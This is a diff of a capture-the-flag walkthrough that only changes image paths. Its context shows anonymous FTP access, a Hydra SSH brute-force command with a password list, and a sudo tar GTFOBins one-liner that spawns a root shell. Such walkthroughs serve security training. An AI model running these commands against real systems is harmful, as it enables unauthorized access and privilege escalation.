@@ -1,7 +1,7 @@
 
 we begin by running an nmap scan we have the following result.
 
-![[1.png]]
+![[/posts/res/BH_1.png]]
  we have the following ports open our target system:
  - 21 (ftp)
  - 22 (ssh)
@@ -19,20 +19,20 @@ ftp <TARGET_IP>
 USERNAME: anonymous
 PASSWORD: leave_blank
 ```
-![[2.png]]
+![[/posts/res/BH_2.png]]
 we have just discovered two file via ftp now we download them to our local machine using the following command:
 
 ```
 mget *
 ```
 
-![[3.png]]
+![[/posts/res/BH_3.png]]
 
 when we cat out the content of the ***locks.txt*** file we can see a list of possible passwords
-![[4.png]]
+![[/posts/res/BH_4.png]]
 
 the ***task.txt*** file simply gives us a message:
-![[5.png]]
+![[/posts/res/BH_5.png]]
 
 since we have have a password  list my next assumption was the use this information from we have to perform a bruteforce attack on the ssh service .
 
@@ -44,7 +44,7 @@ command used: hydra -l lin -P /path/to/file/locks.txt 10.10.252.46 ssh
 ```
 
 now we have a password
-![[6.png]]
+![[/posts/res/BH_6.png]]
 so we can try to login as ***lin*** using ssh
 
 ```
@@ -61,7 +61,7 @@ command used: ls -la
 Let's execute `sudo -l` to observe the privileges granted to the user for running commands as another user or as root.
 
 we are allowed to run the following command:
-![[8.png]]
+![[/posts/res/BH_8.png]]
 
 we are allowed to run tar as root. now we head over Here [[https://gtfobins.github.io/gtfobins/tar/]] to get a prive-esc command 
 
@@ -70,7 +70,7 @@ from gtfo bin we can simply copy and execute the following command to gain root:
 ```
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
-![[9.png]]
+![[/posts/res/BH_9.png]]
 and we are root.
 
 
